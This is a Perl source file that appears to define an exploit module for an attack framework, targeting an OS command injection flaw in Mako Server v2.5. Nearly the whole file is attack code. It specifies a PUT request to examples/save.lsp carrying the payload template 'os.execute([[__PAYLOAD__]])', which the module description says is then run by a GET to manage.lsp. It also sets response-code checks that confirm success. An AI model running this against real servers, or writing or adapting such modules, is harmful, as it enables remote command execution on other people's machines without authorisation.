package MAKOSERVER::MSF::MakoserverCmdExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MakoserverCmdExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a vulnerability found in Mako Server v2.5.

        It's possible to inject arbitrary OS commands in the Mako Server

        tutorial page through a PUT request to save.lsp.



        Attacker input will be saved on the victims machine and can

        be executed by sending a GET request to manage.lsp.

      ",
  MSF_MODULE  => "makoserver_cmd_exec",
  REFERENCES  => ["https://blogs.securiteam.com/index.php/archives/3391"],
  TITLE       => "Mako Server v2.5 OS Command Injection RCE",
  VARIABLES => {
    'URI' =>       { DESCRIPTION => "URI path to the Mako Server app", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'PUT',
      PATH   => 'examples/save.lsp',
      PAYLOAD      => 'os.execute([[__PAYLOAD__]])',
      TEXT   => 'Sending Exploit #1 Request : [PUT] /examples/save.lsp',
      HEADERS      => {
        'Content-Type' => 'text/plain',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
